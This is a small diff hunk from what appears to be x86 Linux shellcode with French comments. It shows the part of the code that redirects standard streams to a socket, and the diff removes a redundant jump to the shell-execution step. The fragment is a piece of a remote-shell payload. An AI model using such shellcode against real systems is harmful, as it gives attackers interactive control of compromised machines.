@@ -71,10 +71,6 @@ redirect_streams:
     mov ebx, edi        ; sockfd
     mov ecx, 2          ; 2 (stderr)
     int 0x80
-    
-    ; Tous les flux standard sont maintenant redirigés vers le socket
-    ; Exécuter le shell
-    jmp execute_shell
 
 execute_shell:
     ; Étape 5 : Exécuter le shell
